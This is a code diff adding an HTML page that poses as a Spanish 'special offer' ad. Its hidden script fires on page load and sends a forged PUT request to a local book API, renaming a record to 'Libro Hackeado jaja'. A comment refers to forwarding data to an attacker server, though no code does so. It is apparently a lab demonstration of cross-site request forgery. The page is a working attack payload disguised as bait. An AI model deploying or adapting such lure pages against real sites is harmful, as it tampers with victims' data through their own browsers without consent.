@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>!OFERTA ESPECIAL!</title>
+</head>
+<body>
+    <h1>OFERTA ESPECIAL</h1>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7XRQsGnXyTmSscXR3e1dF7PWdPjh-ZeiC4g&s" alt="descuento irresistible">
+    <script>
+        // delcaramos el id de libro que deseamos a actualizar 
+        var libroId = "67a40a54f2cc15c1e074a308";
+        // datos que se enviaraon en la solicitud de ataque 
+        var datos = JSON.stringify({ titulo:"Libro Hackeado jaja"});
+        //creamos una silicitud http 
+        var xhr= new XMLHttpRequest();
+        xhr.open('PUT',"http://localhost:3000/libros/"+libroId,true);
+        xhr.setRequestHeader('Content-Type','application/json');
+        xhr.send(datos);
+
+        xhr.onreadystatechange = function(){
+            if(xhr.readyState == 4 && xhr.status == 200){
+                console.log("libro  actualizado", JSON.parse(xhr.responseText));
+                // envia la informacion al servidor del atacante 
+                //localhost://3001 
+            }else{
+                console.log("Error al actualizar el libro", xhr.responseText);
+            }
+        }
+
+    </script>
+    
+</body>
+</html>
